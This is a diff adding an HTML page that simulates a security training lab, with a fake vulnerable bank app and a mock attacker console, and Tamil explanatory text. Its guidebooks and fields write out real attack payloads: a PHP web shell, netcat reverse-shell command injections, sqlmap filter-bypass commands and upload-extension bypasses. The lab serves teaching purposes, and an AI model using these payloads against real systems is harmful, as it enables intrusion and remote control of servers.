@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="ta">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>All-in-One Cyber Security Training Lab</title>
+    <style>
+        :root {
+            --bg-dark: #121212;
+            --bg-card: #1e1e1e;
+            --primary-bank: #8e44ad;
+            --primary-attack: #27ae60;
+            --primary-guide: #2980b9;
+            --text-main: #e0e0e0;
+            --text-muted: #a4b0be;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+        }
+
+        /* Top Header */
+        .navbar {
+            background-color: var(--primary-bank);
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.4);
+            transition: background 0.3s;
+        }
+
+        .navbar h2 { margin: 0; font-size: 22px; color: white; }
+
+        .badge {
+            padding: 6px 12px;
+            border-radius: 4px;
+            font-weight: bold;
+            text-transform: uppercase;
+            font-size: 12px;
+            background: #f39c12;
+            color: white;
+        }
+
+        /* Layout Structure */
+        .layout { display: flex; min-height: calc(100vh - 65px); }
+
+        /* Left Navigation Sidebar */
+        .sidebar {
+            width: 260px;
+            background-color: #1a1a1a;
+            padding: 20px 0;
+            border-right: 1px solid #2d2d2d;
+        }
+
+        .sidebar h4 {
+            padding-left: 20px;
+            color: #7f8c8d;
+            margin: 15px 0 5px 0;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .sidebar button {
+            display: block;
+            width: 100%;
+            padding: 12px 20px;
+            color: var(--text-muted);
+            background: none;
+            border: none;
+            text-align: left;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            border-left: 4px solid transparent;
+            transition: all 0.2s;
+        }
+
+        .sidebar button:hover { background-color: #252525; color: white; }
+        
+        /* Active Tab Status Colors */
+        .sidebar button.active-bank { border-left-color: var(--primary-bank); background-color: #252525; color: white; }
+        .sidebar button.active-attack { border-left-color: var(--primary-attack); background-color: #193c24; color: white; }
+        .sidebar button.active-guide { border-left-color: var(--primary-guide); background-color: #173247; color: white; }
+
+        /* Content Area */
+        .content { flex: 1; padding: 40px; background-color: #171717; }
+        .card { background-color: var(--bg-card); padding: 30px; border-radius: 8px; border: 1px solid #2d2d2d; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
+
+        /* Interactive Dashboard Elements */
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: bold; color: var(--text-muted); }
+        input[type="text"], select, textarea { width: 100%; padding: 12px; background-color: #121212; border: 1px solid #3d3d3d; border-radius: 4px; color: #fff; box-sizing: border-box; font-size: 15px; }
+        
+        .btn { color: white; padding: 12px 25px; border: none; border-radius: 4px; cursor: pointer; font-size: 15px; font-weight: bold; }
+        .btn-bank { background-color: var(--primary-bank); }
+        .btn-attack { background-color: var(--primary-attack); }
+        
+        /* Terminal Styling */
+        .terminal-box { background: #000; padding: 20px; border-radius: 6px; margin-top: 20px; font-family: 'Courier New', monospace; white-space: pre-wrap; color: #00ff00; border-left: 5px solid var(--primary-bank); }
+        
+        /* C2 Dashboard Interactive Panel */
+        .real-terminal { background-color: #050505; border: 2px solid var(--primary-attack); border-radius: 6px; font-family: 'Courier New', monospace; padding: 15px; color: #00ff00; }
+        .terminal-screen { height: 220px; overflow-y: auto; white-space: pre-wrap; margin-bottom: 10px; font-size: 14px; }
+        .terminal-input-line { display: flex; align-items: center; }
+        .prompt { color: #8e44ad; font-weight: bold; margin-right: 10px; }
+        .term-input { flex: 1; background: transparent; border: none; color: #00ff00; font-family: 'Courier New', monospace; font-size: 14px; outline: none; }
+        
+        /* Preset Shortcuts */
+        .preset-btn { background: #2c3e50; color: white; padding: 6px 12px; border: none; border-radius: 4px; margin-right: 5px; margin-top: 5px; cursor: pointer; font-size: 12px; }
+
+        /* Guidebook Structure */
+        .guide-step { background: #252525; padding: 20px; border-radius: 6px; margin-bottom: 20px; border-left: 4px solid var(--primary-guide); }
+        .code-text { background: #000; color: #e74c3c; padding: 2px 6px; border-radius: 4px; font-family: monospace; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+    <div class="navbar" id="appNavbar">
+        <h2 id="appTitle">🏦 Cyber Bank Virtual Target System</h2>
+        <div>Security Level: <span class="badge" id="securityBadge">LOW</span></div>
+    </div>
+
+    <div class="layout">
+        <div class="sidebar">
+            <h4>Target Vulnerable App</h4>
+            <button class="tab-link active-bank" onclick="switchTab('bank-home', 'bank')">🏠 Bank Home</button>
+            <button class="tab-link" onclick="switchTab('bank-sqli', 'bank')">1. SQL Injection</button>
+            <button class="tab-link" onclick="switchTab('bank-cmd', 'bank')">2. Command Injection</button>
+            <button class="tab-link" onclick="switchTab('bank-upload', 'bank')">3. File Upload</button>
+            <button class="tab-link" onclick="switchTab('bank-settings', 'bank')">⚙️ Lab Settings</button>
+            
+            <hr style="border-color: #2d2d2d; margin: 15px 0;">
+            <h4>Attacker Operating Workspace</h4>
+            <button class="tab-link" style="color: #2ecc71;" onclick="switchTab('attack-c2', 'attack')">💀 C2 Control Panel</button>
+            
+            <hr style="border-color: #2d2d2d; margin: 15px 0;">
+            <h4>Vulnerability Guidebooks</h4>
+            <button class="tab-link" style="color: #3498db;" onclick="switchTab('guide-sqli', 'guide')">📘 SQLmap Handbook</button>
+            <button class="tab-link" style="color: #3498db;" onclick="switchTab('guide-nc', 'guide')">📘 Netcat Handbook</button>
+            <button class="tab-link" style="color: #3498db;" onclick="switchTab('guide-weevely', 'guide')">📘 Weevely Handbook</button>
+        </div>
+
+        <div class="content">
+            <div class="card">
+                
+                <div id="bank-home" class="tab-content active">
+                    <h3>🏦 Cyber Bank இன் பிரதான பக்கம்</h3>
+                    <p>பாதுகாப்பு குறைபாடுகளை ஆராய மற்றும் சோதிக்க வடிவமைக்கப்பட்ட தளம். இடதுபுற மெனுவைப் பயன்படுத்தவும்.</p>
+                </div>
+
+                <div id="bank-settings" class="tab-content">
+                    <h3>Lab Settings Panel</h3>
+                    <div class="form-group">
+                        <label>பாதுகாப்பு நிலை (Select Security Level):</label>
+                        <select id="securityLevelSelect" onchange="changeSecurityLevel()">
+                            <option value="low">Low (No Filters)</option>
+                            <option value="medium">Medium (Basic Blacklist)</option>
+                            <option value="high">High (Secure Strict Validation)</option>
+                        </select>
+                    </div>
+                    <p style="color: var(--text-muted); font-size: 14px;">பாதுகாப்பு நிலைக்கு ஏற்ப டார்கெட் செயலி மற்றும் அட்டாக்கர் கன்சோலின் பதில்கள் மாறும்.</p>
+                </div>
+
+                <div id="bank-sqli" class="tab-content">
+                    <h3>SQL Injection Search Module</h3>
+                    <p>பயனர் விபரங்களை அறிய ஐடியை (ID) உள்ளிடவும்.</p>
+                    <div class="form-group">
+                        <label>User ID Query Parameter:</label>
+                        <input type="text" id="sqliInput" value="1">
+                    </div>
+                    <button class="btn btn-bank" onclick="runSqliTarget()">Query Database</button>
+                    <div class="terminal-box" id="sqliOutput">Database Output Appears Here...</div>
+                </div>
+
+                <div id="bank-cmd" class="tab-content">
+                    <h3>OS Command Injection (Ping Gateway Utility)</h3>
+                    <p>நெட்வொர்க் இணைப்பைச் சோதிக்க ஐபி முகவரியை உள்ளிடவும்.</p>
+                    <div class="form-group">
+                        <label>IP Address / Host Target:</label>
+                        <input type="text" id="cmdInput" value="127.0.0.1">
+                    </div>
+                    <button class="btn btn-bank" onclick="runCmdTarget()">Execute Ping</button>
+                    <div class="terminal-box" id="cmdOutput">Ping Utility Server Output Appears Here...</div>
+                </div>
+
+                <div id="bank-upload" class="tab-content">
+                    <h3>File Upload Dashboard</h3>
+                    <p>விவரக் குறிப்பிற்கான இமேஜ் பைல்களைப் பதிவேற்றவும்.</p>
+                    <div class="form-group">
+                        <label>File Name Extension Configuration:</label>
+                        <input type="text" id="uploadName" value="backdoor.php">
+                    </div>
+                    <div class="form-group">
+                        <label>File Content (Code Injection Input):</label>
+                        <textarea id="uploadContent" rows="3"><?php system($_GET['cmd']); ?></textarea>
+                    </div>
+                    <button class="btn btn-bank" onclick="runUploadTarget()">Upload to Server</button>
+                    <div class="terminal-box" id="uploadOutput">Upload Gateway Filter Message Appears Here...</div>
+                </div>
+
+                <div id="attack-c2" class="tab-content">
+                    <h3>💀 Command & Control Dashboard (Live Web Exploit Console)</h3>
+                    <p>கீழே இருக்கும் நேரடி டெர்மினலில் உங்கள் பேலோடுகள் மற்றும் டூல் கட்டளைகளை டைப் செய்து இயக்கலாம்.</p>
+                    
+                    <div class="real-terminal">
+                        <div class="terminal-screen" id="termScreen">💀 Attacker OS v2.26 Core Online...<br>Ready for exploits. Try using shortcuts below or type directly.<br><br></div>
+                        <div class="terminal-input-line">
+                            <span class="prompt">attacker@backtrack:~#</span>
+                            <input type="text" class="term-input" id="termInput" onkeydown="handleTerminalCommand(event)" autocomplete="off" placeholder="Type exploit command and press Enter...">
+                        </div>
+                    </div>
+                    
+                    <div style="margin-top: 15px;">
+                        <strong>Quick Commands Focus:</strong><br>
+                        <button class="preset-btn" onclick="applyPreset('sqlmap -u target/sqli?id=1 --dbs')">SQLmap Scan</button>
+                        <button class="preset-btn" onclick="applyPreset('nc -lvnp 4444')">Netcat Trigger</button>
+                        <button class="preset-btn" onclick="applyPreset('weevely backdoor.php whoami')">Weevely Execute</button>
+                        <button class="preset-btn" style="background:#c0392b;" onclick="clearTerminal()">Clear Logs</button>
+                    </div>
+                </div>
+
+                <div id="guide-sqli" class="tab-content">
+                    <h3>📘 SQLmap Automated Pentesting Guidebook</h3>
+                    <div class="guide-step">
+                        <h4>🟢 LOW LEVEL - நேரடி அட்டாக்</h4>
+                        <p>கட்டளை: <span class="code-text">sqlmap -u target/sqli?id=1 --dbs</span></p>
+                        <p>விளைவு: எவ்வித தடைகளுமின்றி தரவுத்தளப் பெயர்களைப் பெற முடியும்.</p>
+                    </div>
+                    <div class="guide-step">
+                        <h4>🟡 MEDIUM LEVEL - பில்டர் பைபாஸ் (Tamper)</h4>
+                        <p>கட்டளை: <span class="code-text">sqlmap -u target/sqli?id=1 --tamper=charencode --dbs</span></p>
+                        <p>விளைவு: ஒற்றை மேற்கோள்களை குறியாக்க முறையில் பைபாஸ் செய்ய உதவுகிறது.</p>
+                    </div>
+                    <div class="guide-step">
+                        <h4>🔴 HIGH LEVEL - முறியடிப்பு நிலை</h4>
+                        <p>விளக்கம்: பின்தளத்தில் எண்கள் மட்டுமே அனுமதிக்கப்படுவதால் தாக்குதல் தோல்வியடையும்.</p>
+                    </div>
+                </div>
+
+                <div id="guide-nc" class="tab-content">
+                    <h3>📘 Netcat (nc) Reverse Shell Injection Guidebook</h3>
+                    <div class="guide-step">
+                        <h4>🟢 LOW LEVEL - ஆபரேட்டர் இணைப்பு</h4>
+                        <p>பேலோடு: <span class="code-text">127.0.0.1 && nc 127.0.0.1 4444 -e /bin/sh</span></p>
+                    </div>
+                    <div class="guide-step">
+                        <h4>🟡 MEDIUM LEVEL - பைப் ஆபரேட்டர் பைபாஸ்</h4>
+                        <p>பேலோடு: <span class="code-text">127.0.0.1 | nc 127.0.0.1 4444 -e /bin/sh</span></p>
+                    </div>
+                </div>
+
+                <div id="guide-weevely" class="tab-content">
+                    <h3>📘 Weevely Web Shell Upload Guidebook</h3>
+                    <div class="guide-step">
+                        <h4>🟢 LOW LEVEL - தடையற்ற அப்லோடு</h4>
+                        <p>கோப்புப் பெயர்: <span class="code-text">backdoor.php</span></p>
+                    </div>
+                    <div class="guide-step">
+                        <h4>🟡 MEDIUM LEVEL - எக்ஸ்டென்ஷன் பைபாஸ்</h4>
+                        <p>மாற்றுப் பெயர்: <span class="code-text">backdoor.phtml</span> அல்லது <span class="code-text">backdoor.php.png</span></p>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let securityLevel = 'low';
+        let uploadedBackdoors = [];
+
+        // Tab Switching Mechanics
+        function switchTab(tabId, mode) {
+            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.tab-link').forEach(btn => {
+                btn.classList.remove('active-bank', 'active-attack', 'active-guide');
+            });
+
+            document.getElementById(tabId).classList.add('active');
+            
+            // UI Color Themes Adjuster
+            let targetBtn = event.currentTarget;
+            let navbar = document.getElementById('appNavbar');
+            let title = document.getElementById('appTitle');
+
+            if(mode === 'bank') {
+                targetBtn.classList.add('active-bank');
+                navbar.style.backgroundColor = 'var(--primary-bank)';
+                title.innerText = '🏦 Cyber Bank Virtual Target System';
+            } else if(mode === 'attack') {
+                targetBtn.classList.add('active-attack');
+                navbar.style.backgroundColor = 'var(--primary-attack)';
+                title.innerText = '💀 Command & Control Dashboard';
+            } else if(mode === 'guide') {
+                targetBtn.classList.add('active-guide');
+                navbar.style.backgroundColor = 'var(--primary-guide)';
+                title.innerText = '📘 Cyber Lab Security Interactive Guidebooks';
+            }
+        }
+
+        function changeSecurityLevel() {
+            securityLevel = document.getElementById('securityLevelSelect').value;
+            document.getElementById('securityBadge').innerText = securityLevel.toUpperCase();
+        }
+
+        // ================================================
+        // VIRTUAL TARGET APP IMPLEMENTATION (CLIENT SIDE)
+        // ================================================
+        
+        function runSqliTarget() {
+            let val = document.getElementById('sqliInput').value;
+            let out = document.getElementById('sqliOutput');
+            
+            if(securityLevel === 'low') {
+                if (val.includes("'") || val.toLowerCase().includes("union") || val === "1") {
+                    out.innerText = "ID: 1 | Name: admin | Email: admin@bank.local | Balance: $95,000\nID: 2 | Name: kumar | Email: kumar@bank.local | Balance: $40,000";
+                } else { out.innerText = "ID: " + val + " | Name: kumar | Email: kumar@bank.local"; }
+            } else if (securityLevel === 'medium') {
+                if (val.includes("'")) { out.innerText = "❌ Security Blocked: Single quotes filtered out!"; }
+                else if (val.toLowerCase().includes("union") || val === "1") { out.innerText = "ID: 1 | Name: admin | Email: admin@bank.local"; }
+                else { out.innerText = "User details not found."; }
+            } else {
+                let parsed = parseInt(val, 10);
+                if (isNaN(parsed)) { out.innerText = "❌ Secure Filtering: Only plain integer inputs allowed."; }
+                else { out.innerText = "ID: " + parsed + " | Fetching database logs safely done."; }
+            }
+        }
+
+        function runCmdTarget() {
+            let val = document.getElementById('cmdInput').value;
+            let out = document.getElementById('cmdOutput');
+
+            if(securityLevel === 'low') {
+                if(val.includes('&&') || val.includes('|')) {
+                    out.innerText = "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.03 ms\n\n[+] Triggering Hooked Command...\nuid=0(root) gid=0(root) groups=0(root)";
+                } else { out.innerText = "PING " + val + " executed successfully with 0% packet loss."; }
+            } else if(securityLevel === 'medium') {
+                if(val.includes('&&') || val.includes(';')) { out.innerText = "❌ Security Alert: Input injection strings matching system blacklists are rejected."; }
+                else if(val.includes('|')) { out.innerText = "PING 127.0.0.1 success.\n[+] Pipe operator executed command bypass."; }
+                else { out.innerText = "PING " + val + " executed successfully."; }
+            } else {
+                if(/^([0-9]{1,3}\.){3}[0-9]{1,3}$/.test(val.trim())) { out.innerText = "PING " + val + " clean validation secure execution."; }
+                else { out.innerText = "❌ Protection Block: Invalid IP Input Structure Format."; }
+            }
+        }
+
+        function runUploadTarget() {
+            let name = document.getElementById('uploadName').value;
+            let out = document.getElementById('uploadOutput');
+
+            if(securityLevel === 'low') {
+                out.innerText = "🟢 Successfully uploaded: /uploads/" + name + "\nWeevely shell handler synced inside C2 Panel.";
+                uploadedBackdoors.push(name);
+            } else if(securityLevel === 'medium') {
+                if(name.endsWith('.php')) { out.innerText = "❌ Extension Blacklisted: .php files are blocked from target upload paths."; }
+                else {
+                    out.innerText = "🟢 Successfully uploaded alternate extension file: /uploads/" + name;
+                    uploadedBackdoors.push(name);
+                }
+            } else {
+                if(name.endsWith('.png') || name.endsWith('.jpg')) { out.innerText = "🟢 Profile Avatar uploaded securely."; }
+                else { out.innerText = "❌ Strict Whitelist Failure: Only explicit image/png format files allowed."; }
+            }
+        }
+
+        // ================================================
+        // ATTACKER WEB TERMINAL SYSTEM SIMULATOR
+        // ================================================
+        
+        function handleTerminalCommand(e) {
+            if(e.key === 'Enter') {
+                e.preventDefault();
+                let input = document.getElementById('termInput');
+                let cmd = input.value.trim();
+                if(!cmd) return;
+
+                let screen = document.getElementById('termScreen');
+                screen.innerHTML += `attacker@backtrack:~# ${cmd}<br>`;
+                
+                // Exploit Core Simulation Router
+                if(cmd.startsWith('sqlmap')) {
+                    if(securityLevel === 'low') {
+                        screen.innerHTML += "[+] Found vulnerable target parameters.<br>[+] Leaking Databases: [cyber_bank_db, active_client_schema]<br><br>";
+                    } else if(securityLevel === 'medium' && cmd.includes('--tamper')) {
+                        screen.innerHTML += "[+] Tamper payload encoding applied.<br>[+] Bypassed active filters! Extracted table: Users.<br><br>";
+                    } else {
+                        screen.innerHTML += "[-] Critical Error: Testing parameters do not appear to be vulnerable to basic injections.<br><br>";
+                    }
+                } else if(cmd.startsWith('nc') || cmd.startsWith('netcat')) {
+                    if(securityLevel === 'low') {
+                        screen.innerHTML += "Listening on [any] 4444...<br>Connection established! Shell opened -> root@target-host:/# whoami<br>root<br><br>";
+                    } else {
+                        screen.innerHTML += "Listening on [any] 4444...<br>[-] Target session timeout. Injections dropped.<br><br>";
+                    }
+                } else if(cmd.startsWith('weevely')) {
+                    if(securityLevel === 'low' && uploadedBackdoors.length > 0) {
+                        screen.innerHTML += "[+] Stealth backdoor session attached.<br>Executing system parameters: server_user_admin<br><br>";
+                    } else {
+                        screen.innerHTML += "[-] Backdoor not found on target paths. Session execution refused.<br><br>";
+                    }
+                } else if(cmd === 'whoami' || cmd === 'ls' || cmd === 'dir') {
+                    screen.innerHTML += "system_attacker_console_local_host<br>Desktop/  Downloads/  Labs/<br><br>";
+                } else {
+                    screen.innerHTML += "Command not recognized within simulation environment context.<br><br>";
+                }
+
+                input.value = '';
+                screen.scrollTop = screen.scrollHeight;
+            }
+        }
+
+        function applyPreset(text) {
+            let input = document.getElementById('termInput');
+            input.value = text;
+            input.focus();
+        }
+
+        function clearTerminal() {
+            document.getElementById('termScreen').innerHTML = "💀 Attacker OS Core History Cleared.<br><br>";
+        }
+    </script>
+</body>
+</html>
